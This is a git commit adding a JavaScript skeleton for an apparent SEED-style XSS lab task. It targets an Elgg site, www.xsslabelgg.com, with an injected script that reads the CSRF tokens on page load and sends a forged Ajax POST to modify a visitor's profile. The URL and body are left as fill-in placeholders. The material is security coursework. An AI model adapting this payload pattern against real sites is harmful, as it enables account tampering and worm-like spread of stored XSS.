3d38af0b1827b0726d6f6b96dc189f0e1c92c795
pauljainta <58131098+pauljainta@users.noreply.github.com>
2021-06-20 20:38:12 +0600

    task 2 initiated

---
+++ 1605022_Task_2.js
@@ -0,0 +1,24 @@
+//6. Skeleton for Task 2
+<script type="text/javascript">
+	window.onload = function(){
+	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+	//and Security Token __elgg_token
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+	//Construct the content of your url.
+        var sendurl=...; //FILL IN
+	var content=...; //FILL IN
+	
+	if(//Condition to check if the user is not Samy)
+	{
+		//Create and send Ajax request to modify profile
+		var Ajax=null;
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+		Ajax.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax.send(content);
+	}
+	}
+</script>
